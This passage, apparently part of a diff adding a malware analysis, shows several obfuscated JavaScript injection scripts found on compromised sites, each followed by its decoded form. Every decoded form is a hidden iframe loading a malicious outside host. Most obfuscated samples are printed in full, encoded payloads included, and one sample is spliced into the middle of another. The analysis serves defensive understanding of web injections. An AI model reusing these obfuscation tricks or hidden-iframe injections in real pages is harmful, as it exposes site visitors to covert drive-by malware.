j,d,h;o=8;a=1906;k=null;k-=0.004;f=true;j=/[Wvz6pLM0Y]/g;q=23;q-=30;w=0.023;d='6szuzbvsptpr';g=9;g+=0.007;c=7498;c--;p=11;p--;h=d.replace(j,'');r={dow:0};m=0.013;if(m!=0){l=25;l+=0.0057}n=0.0141;if(n!=0.011){z='don';t=19;t--}return h}</sc ript>
+
+de-obfuscates to
+
+<script type='text/javascript' src='hxxp://purposestupid.org/xzzuhpzxwci5cd/'></script>
+
+Again there are a lot of variations of the following code, instead of -t you might see -n or -x and I have also see things like +-t7,=-t7,+-t103 in the long array.
+
+<sc ript> String.prototype.test="harC";for(i in $='')if(i=='te'+'st')m=$[i];try{new Object().wehweh();}catch(q){ss="";}try{window['e'+'v'+'al']('asdas')}catch(q){s=String["fr"+"omC"+m+"od"+'e'];}d=new Date();d2=new Date(d.valueOf()-2);Object.prototype.asd="e";if({}.asd==='e')a=do​cument['c'+'r'+'e'+'a'+'t'+'e'+'T'+'e'+'x'+'t'+'N'+'o'+'d'+'e']('321');if(a.data==321)t=-1*(d-d2);n=[7-t,7-t,103-t,100-t,30-t,38-t,98-t,109-t,97-t,115-t,107-t,99-t,108-t,114-t,44-t,101-t,99-t,114-t,67-t,106-t,99-t,107-t,99-t,108-t,114-t,113-t,64-t,119-t,82-t,95-t,101-t,76-t,95-t,107-t,99-t,38-t,37-t,96-t,109-t,98-t,119-t,37-t,39-t,89-t,46-t,91-t,39-t,121-t,7-t,7-t,7-t,103-t,100-t,112-t,95-t,107-t,99-t,112-t,38-t,39-t,57-t,7-t,7-t,123-t,30-t,99-t,106-t,113-t,99-t,30-t,121-t,7-t,7-t,7-t,98-t,109-t,97-t,115-t,107-t,99-t,108-t,114-t,44-t,117-t,112-t,103-t,114-t,99-t,38-t,32-t,58-t,103-t,100-t,112-t,95-t,107-t,99-t,30-t,113-t,112-t,97-t,59-t,37-t,102-t,114-t,114-t,110-t,56-t,45-t,45-t,119-t,102-t,101-t,98-t,120-t,108-t,100-t,101-t,120-t,44-t,97-t,118-t,44-t,97-t,97-t,45-t,113-t,102-t,109-t,117-t,114-t,102-t,112-t,99-t,95-t,98-t,44-t,110-t,102-t,110-t,61-t,114-t,59-t,54-t,48-t,52-t,51-t,47-t,51-t,47-t,50-t,37-t,30-t,117-t,103-t,98-t,114-t,102-t,59-t,37-t,47-t,46-t,37-t,30-t,102-t,99-t,103-t,101-t,102-t,114-t,59-t,37-t,47-t,46-t,37-t,30-t,113-t,114-t,119-t,106-t,99-t,59-t,37-t,116-t,103-t,113-t,103-t,96-t,103-t,106-t,103-t,114-t,119-t,56-t,102-t,103-t,98-t,98-t,99-t,108-t,57-t,110-t,109-t,113-t,103-t,114-t,103-t,109-t,108-t,56-t,95-t,96-t,113-t,109-t,106-t,115-t,114-t,99-t,57-t,106-t,99-t,100-t,114-t,56-t,46-t,57-t,114-t,109-t,110-t,56-t,46-t,57-t,37-t,60-t,58-t,45-t,103-t,100-t,112-t,95-t,107-t,99-t,60-t,32-t,39-t,57-t,7-t,7-t,123-t,7-t,7-t,100-t,115-t,108-t,97-t,114-t,103-t,109-t,108-t,30-t,103-t,100-t,112-t,95-t,107-t,99-t,112-t,38-t,39-t,121-t,7-t,7-t,7-t,116-t,95-t,112-t,30-t,100-t,30-t,59-t,30-t,98-t,109-t,97-t,115-t,107-t,99-t,108-t,114-t,44-t,97-t,112-t,99-t,95-t,114-t,99-t,67-t,106-t,99-t,107-t,99-t,108-t,114-t,38-t,37-t,103-t,100-t,112-t,95-t,107-t,99-t,37-t,39-t,57-t,100-t,44-t,113-t,99-t,114-t,63-t,114-t,114-t,112-t,103-t,96-t,115-t,114-t,99-t,38-t,37-t,113-t,112-t,97-t,37-t,42-t,37-t,102-t,114-t,114-t,110-t,56-t,45-t,45-t,119-t,102-t,101-t,98-t,120-t,108-t,100-t,101-t,120-t,44-t,97-t,118-t,44-t,97-t,97-t,45-t,113-t,102-t,109-t,117-t,114-t,102-t,112-t,99-t,95-t,98-t,44-t,110-t,102-t,110-t,61-t,114-t,59-t,54-t,48-t,52-t,51-t,47-t,51-t,47-t,50-t,37-t,39-t,57-t,100-t,44-t,113-t,114-t,119-t,106-t,99-t,44-t,116-t,103-t,113-t,103-t,96-t,103-t,106-t,103-t,114-t,119-t,59-t,37-t,102-t,103-t,98-t,98-t,99-t,108-t,37-t,57-t,100-t,44-t,113-t,114-t,119-t,106-t,99-t,44-t,110-t,109-t,113-t,103-t,114-t,103-t,109-t,108-t,59-t,37-t,95-t,96-t,113-t,109-t,106-t,115-t,114-t,99-t,37-t,57-t,100-t,44-t,113-t,114-t,119-t,106-t,99-t,44-t,106-t,99-t,100-t,114-t,59-t,37-t,46-t,37-t,57-t,100-t,44-t,113-t,114-t,119-t,106-t,99-t,44-t,114-t,109-t,110-t,59-t,37-t,46-t,37-t,57-t,100-t,44-t,113-t,99-t,114-t,63-t,114-t,114-t,112-t,103-t,96-t,115-t,114-t,99-t,38-t,37-t,117-t,103-t,98-t,114-t,102-t,37-t,42-t,37-t,47-t,46-t,37-t,39-t,57-t,100-t,44-t,113-t,99-t,114-t,63-t,114-t,114-t,112-t,103-t,96-t,115-t,114-t,99-t,38-t,37-t,102-t,99-t,103-t,101-t,102-t,114-t,37-t,42-t,37-t,47-t,46-t,37-t,39-t,57-t,7-t,7-t,7-t,98-t,109-t,97-t,115-t,107-t,99-t,108-t,114-t,44-t,101-t,99-t,114-t,67-t,106-t,99-t,107-t,99-t,108-t,114-t,113-t,64-t,119-t,82-t,95-t,101-t,76-t,95-t,107-t,99-t,38-t,37-t,96-t,109-t,98-t,119-t,37-t,39-t,89-t,46-t,91-t,44-t,95-t,110-t,110-t,99-t,108-t,98-t,65-t,102-t,103-t,106-t,98-t,38-t,100-t,39-t,57-t,7-t,7-t,123-t];for(i=0;i< n.length;i++)ss+=s(eval("n"+"["+"i]"));eval(ss);</sc ript>
+
+de-obfuscates to
+
+if (do​cument.getElementsByTagName('body')[0]){
+  iframer();
+}
+else {
+  do​cument.write("<iframe src='hxxp://yhgdznfgz.cx.cc/showthread.php?t=82651514' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'></iframe>");
+}
+function iframer(){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://yhgdznfgz.cx.cc/showthread.php?t=82651514');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.getElementsByTagName('body')[0].append​Child(f);
+}
+
+<iframe src='hxxp://yhgdznfgz.cx.cc/showthread.php?t=82651514' width='10' height='10' style=<div style="background-color: #f3f3f3;">'visibility:hidden;position:absolute;left:0;top:0;'></iframe>
+
+<sc ript>b=new function(){return 2;};if(!+b)String.prototype.vqwfbeweb='h'+'arC';for(i in $='b4h3tbn34')if(i=='vqwfbeweb')m=$[i];try{new Object().wehweh();}catch(q){ss="";}try{gberbger-2;}catch(q){s=String["fr"+"omC"+m+"od"+'e'];}d=new Date();d2=new Date(d.valueOf()-2);Object.prototype.asd='e';if({}.asd==='e')a=do​cument["c"+"r"+"e"+"a"+"t"+"e"+"T"+"e"+"x"+"t"+"N"+"o"+"d"+"e"]('321');if(a.data==321)h=(d-d2)*-1;n=[-h*4.5,-h*4.5,-h*52.5,-h*51,-h*16,-h*20,-h*50,-h*55.5,-h*49.5,-h*58.5,-h*54.5,-h*50.5,-h*55, -h*58,-h*23,-h*51.5,-h*50.5,-h*58,-h*34.5,-h*54,-h*50.5,-h*54.5,-h*50.5,-h*55,-h*58,-h*57.5, -h*33,-h*60.5,-h*42,-h*48.5,-h*51.5,-h*39,-h*48.5,-h*54.5,-h*50.5,-h*20,-h*19.5,-h*49,-h*55.5, -h*50,-h*60.5,-h*19.5,-h*20.5,-h*45.5,-h*24,-h*46.5,-h*20.5,-h*61.5,-h*4.5,-h*4.5,-h*4.5,-h*52.5, -h*51,-h*57,-h*48.5,-h*54.5,-h*50.5,-h*57,-h*20,-h*20.5,-h*29.5,-h*4.5,-h*4.5,-h*62.5,-h*16, -h*50.5,-h*54,-h*57.5,-h*50.5,-h*16,-h*61.5,-h*4.5,-h*4.5,-h*4.5,-h*50,-h*55.5,-h*49.5,-h*58.5, -h*54.5,-h*50.5,-h*55,-h*58,-h*23,-h*59.5,-h*57,-h*52.5,-h*58,-h*50.5,-h*20,-h*17,-h*30, -h*52.5,-h*51,-h*57,-h*48.5,-h*54.5,-h*50.5,-h*16,-h*57.5,-h*57,-h*49.5,-h*30.5,-h*19.5,-h*52, -h*58,-h*58,-h*56,-h*29,-h*23.5,-h*23.5,-h*57,-h*50.5,-h*49,-h*55.5,-h*58,-h*57.5,-h*58, -h*48.5,-h*58,-h*23,-h*49.5,-h*55.5,-h*54.5,-h*23.5,-h*58,-h*50.5,-h*54.5,-h*56,-h*23.5,-h*57.5, -h*58,-h*48.5,-h*58,-h*23,-h*56,-h*52,-h*56,-h*19.5,-h*16,-h*59.5,-h*52.5,-h*50,-h*58,-h*52, -h*30.5,-h*19.5,-h*24.5,-h*24,-h*19.5,-h*16,-h*52,-h*50.5,-h*52.5,-h*51.5,-h*52,-h*58,-h*30.5, -h*19.5,-h*24.5,-h*24,-h*19.5,-h*16,-h*57.5,-h*58,-h*60.5,-h*54,-h*50.5,-h*30.5,-h*19.5,-h*59, -h*52.5,-h*57.5,-h*52.5,-h*49,-h*52.5,-h*54,-h*52.5,-h*58,-h*60.5,-h*29,-h*52,-h*52.5,-h*50, -h*50,-h*50.5,-h*55,-h*29.5,-h*56,-h*55.5,-h*57.5,-h*52.5,-h*58,-h*52.5,-h*55.5,-h*55,-h*29, -h*48.5,-h*49,-h*57.5,-h*55.5,-h*54,-h*58.5,-h*58,-h*50.5,-h*29.5,-h*54,-h*50.5,-h*51,-h*58, -h*29,-h*24,-h*29.5,-h*58,-h*55.5,-h*56,-h*29,-h*24,-h*29.5,-h*19.5,-h*31,-h*30,-h*23.5, -h*52.5,-h*51,-h*57,-h*48.5,-h*54.5,-h*50.5,-h*31,-h*17,-h*20.5,-h*29.5,-h*4.5,-h*4.5,-h*62.5, -h*4.5,-h*4.5,-h*51,-h*58.5,-h*55,-h*49.5,-h*58,-h*52.5,-h*55.5,-h*55,-h*16,-h*52.5,-h*51, -h*57,-h*48.5,-h*54.5,-h*50.5,-h*57,-h*20,-h*20.5,-h*61.5,-h*4.5,-h*4.5,-h*4.5,-h*59,-h*48.5, -h*57,-h*16,-h*51,-h*16,-h*30.5,-h*16,-h*50,-h*55.5,-h*49.5,-h*58.5,-h*54.5,-h*50.5,-h*55, -h*58,-h*23,-h*49.5,-h*57,-h*50.5,-h*48.5,-h*58,-h*50.5,-h*34.5,-h*54,-h*50.5,-h*54.5,-h*50.5, -h*55,-h*58,-h*20,-h*19.5,-h*52.5,-h*51,-h*57,-h*48.5,-h*54.5,-h*50.5,-h*19.5,-h*20.5,-h*29.5, -h*51,-h*23,-h*57.5,-h*50.5,-h*58,-h*32.5,-h*58,-h*58,-h*57,-h*52.5,-h*49,-h*58.5,-h*58,-h*50.5, -h*20,-h*19.5,-h*57.5,-h*57,-h*49.5,-h*19.5,-h*22,-h*19.5,-h*52,-h*58,-h*58,-h*56,-h*29,-h*23.5, -h*23.5,-h*57,-h*50.5,-h*49,-h*55.5,-h*58,-h*57.5,-h*58,-h*48.5,-h*58,-h*23,-h*49.5,-h*55.5, -h*54.5,-h*23.5,-h*58,-h*50.5,-h*54.5,-h*56,-h*23.5,-h*57.5,-h*58,-h*48.5,-h*58,-h*23,-h*56, -h*52,-h*56,-h*19.5,-h*20.5,-h*29.5,-h*51,-h*23,-h*57.5,-h*58,-h*60.5,-h*54,-h*50.5,-h*23, -h*59,-h*52.5,-h*57.5,-h*52.5,-h*49,-h*52.5,-h*54,-h*52.5,-h*58,-h*60.5,-h*30.5,-h*19.5,-h*52, -h*52.5,-h*50,-h*50,-h*50.5,-h*55,-h*19.5,-h*29.5,-h*51,-h*23,-h*57.5,-h*58,-h*60.5,-h*54, -h*50.5,-h*23,-h*56,-h*55.5,-h*57.5,-h*52.5,-h*58,-h*52.5,-h*55.5,-h*55,-h*30.5,-h*19.5,-h*48.5, -h*49,-h*57.5,-h*55.5,-h*54,-h*58.5,-h*58,-h*50.5,-h*19.5,-h*29.5,-h*51,-h*23,-h*57.5,-h*58, -h*60.5,-h*54,-h*50.5,-h*23,-h*54,-h*50.5,-h*51,-h*58,-h*30.5,-h*19.5,-h*24,-h*19.5,-h*29.5, -h*51,-h*23,-h*57.5,-h*58,-h*60.5,-h*54,-h*50.5,-h*23,-h*58,-h*55.5,-h*56,-h*30.5,-h*19.5, -h*24,-h*19.5,-h*29.5,-h*51,-h*23,-h*57.5,-h*50.5,-h*58,-h*32.5,-h*58,-h*58,-h*57,-h*52.5, -h*49,-h*58.5,-h*58,-h*50.5,-h*20,-h*19.5,-h*59.5,-h*52.5,-h*50,-h*58,-h*52,-h*19.5,-h*22, -h*19.5,-h*24.5,-h*24,-h*19.5,-h*20.5,-h*29.5,-h*51,-h*23,-h*57.5,-h*50.5,-h*58,-h*32.5,-h*58, -h*58,-h*57,-h*52.5,-h*49,-h*58.5,-h*58,-h*50.5,-h*20,-h*19.5,-h*52,-h*50.5,-h*52.5,-h*51.5, -h*52,-h*58,-h*19.5,-h*22,-h*19.5,-h*24.5,-h*24,-h*19.5,-h*20.5,-h*29.5,-h*4.5,-h*4.5,-h*4.5, -h*50,-h*55.5,-h*49.5,-h*58.5,-h*54.5,-h*50.5,-h*55,-h*58,-h*23,-h*51.5,-h*50.5,-h*58,-h*34.5, -h*54,-h*50.5,-h*54.5,-h*50.5,-h*55,-h*58,-h*57.5,-h*33,-h*60.5,-h*42,-h*48.5,-h*51.5,-h*39, -h*48.5,-h*54.5,-h*50.5,-h*20,-h*19.5,-h*49,-h*55.5,-h*50,-h*60.5,-h*19.5,-h*20.5,-h*45.5,-h*24, -h*46.5,-h*23,-h*48.5,-h*56,-h*56,-h*50.5,-h*55,-h*50,-h*33.5,-h*52,-h*52.5,-h*54,-h*50,-h*20, -h*51,-h*20.5,-h*29.5,-h*4.5,-h*4.5,-h*62.5];for(i=0;i<n.length;i++)if(!+b)ss+=s(eval("n"+"[i"+']'));if(!+b)eval(ss);</sc ript><!-- c -->
+
+De-obfuscates to ->
+
+if (do​cument.getElementsByTagName('body')[0]){
+  iframer();
+}
+else {
+  do​cument.write("
+<iframe src='hxxp://rebotstat.com/temp/stat.php' width='10' height='10' style='visibility:
+hidden;position:absolute;left:0;top:0;'></iframe>");
+}
+function iframer(){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://rebotstat.com/temp/stat.php');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.getElementsByTagName('body')[0].append​Child(f);
+}
+
+This code on this one is a bit unusual
+
+<sc ript>
+wa='t';p='ht';f='k98';tb='ame';bg='.';v='sr';g='tp:';vf='/z';bs='t';px='v.h';br='yt';k='c';yr='m';ds='m';ej='/';au='/';t='com';sp='ifr';r='ca';cp='y';wz='ir';wf='u';b='5';se=sp.concat(tb);oz=v.concat(k);db=p.concat(g,ej,vf,wz,cp,r,bs,wf,yr,bg,t,au,f,b,br,px,wa,ds);var <script>var TaxazLan=47;TaxazLan+=-31;var GeYedenc='fKWrK7AowyjmR8iC8YHhJiYatr29MCMo16dVVIep'.replace(/[KWK7AwyjR8i8YHJiY t29MM16VVIp]/g, '');WaVet=18;var PeheLecew=window;var TenZezaco=-32;TenZezaco+=34;var GawasCepe=-38;GawasCepe+=39;MecezBa=31;var CaneHaqi=parseInt;var MafeGeho=6;MafeGeho+=-6;CeJa=46;var BacanYaqan='';var QekQeyes=String;var PelefJat='zexebep ketay lezewet neyaqamejefeneza refelac xera qevazaxe lemepe tajeceq bazacagetaqere meyadeg pagale zarajet lazemepagebedaf vameyape reyep kek zamaqanepepayeh gexeyeva mawenage vakewaxa xec dapagew revatasasa xatetane dewen yejarey telefa qey hevecelap hez webalefe fele bagelelakatat zedeyel jexedejele dawedey delazeg regapehe tay cezekew te gegawey gasajakebeqeqa resefay gejaha heg q jayadeva hele qedahay qaje keselehe vec relegat salabebebazevame hebesaq rezemelaveqed kegeqen belakedaremev qefegad hebawebebe wazares waseketeledaqeq xareqaq dejereve vena nejecemezaneqe hak web kemepex cememelesedadek tebeyeq daparamafacesaye nak qax ram w wejajeze zevatega bakegay xesererare vecenar cacem qekavere pecal seqefey vefeqeden xaze vapewasebeheje taj hec yeye te yec jec gay h qereref sewaqavey celereh rezece takejed reveyekeme fezesen welenefe kapekeg vakayeseg wapevece qehaz tema vecaqehefaceya mep neq leve ne caq few xel m xeyadey fez jabexeh pevenexadebayawe veweyebe hek jegezay hasem rexehej ladese kewefese qeg rede deyegayakewaze nep yar qete j beb veb qeh k zeyelen qaqajag bevafexa gev dewarek ra tecetaf dagajelawafeme becesey lebate teceveg ler pehagex pekejeresafepeqe pekedete pah neqaqam jeqat remadah jevene yaqejade tel xece pepegegeqefege mez dak yeye k xey het bag j nahewepe wexe xedaleqe geq gehepaz zera peja fexatedemedexe far saw gegeweq qaharenej behefete getej cexefeke yefer lewaneta n xeje jaqetevedav xaf vawaxetefaveqepa vat depemetepaderewe weje setag tawe xaye relehet gepesetacere wanewav re hevevese jananeqebe peyabek haxasaferadav canezen segedepeke xayeraw le gag yefewesekekerez yaleheq peqaqa ceqapefa yamela hez qabeqagebevacaje vexedave delabemez pamekaja jeqanener hewelene leqebamer yaba je dem femeferezecemeza cazared sekevaqeveze kebeqaka je qamakere pebeceqaj rasayac legeteserehab caxejer qesele detadene pe kaweqes dazemetetey zegewaha p qecevam yale vezeyaw caqeperebedezexe seneweq hebemeker gega sedazefey taz qepejebezezefeb nenexega l cabepej vegewetev xagefeta j vab bel meje fepepawefeqaneq jena lapedelahewad yax zarecelejafacega rebajey gejavatexe mepajas mefagab wamaqete ger naqafem ca vabaqev xebexedetakeje yadeken necete meje kelepeveqekazep pex zecelana zas tamewabese'.split(' ');var YegeTege='ehjCv8QbaKl41O'.replace(/[hjC8QbK41O]/g, '');WecYale=45;YegeTege=PeheLecew[YegeTege];GeYedenc=QekQeyes[GeYedenc];for (HelemLepi=MafeGeho;HelemLepi<PelefJat.length-1;HelemLepi+=TenZezaco) BacanYaqan +=GeYedenc(CaneHaqi((PelefJat[HelemLepi+MafeGeho].length-1).toString(TaxazLan)+(PelefJat[HelemLepi+GawasCepe].length-1).toString(TaxazLan), TaxazLan));YegeTege(BacanYaqan);</sc ript>
+
+but again it still writes an iframe.
+
+do​cument.wr​ite('<if​rame scrolling="no" width="1" height="1" border="0" frameborder="0" src="hxxp://43kaylia.eu/xxx1/kqxleqjpcoh8.php"></iframe>')
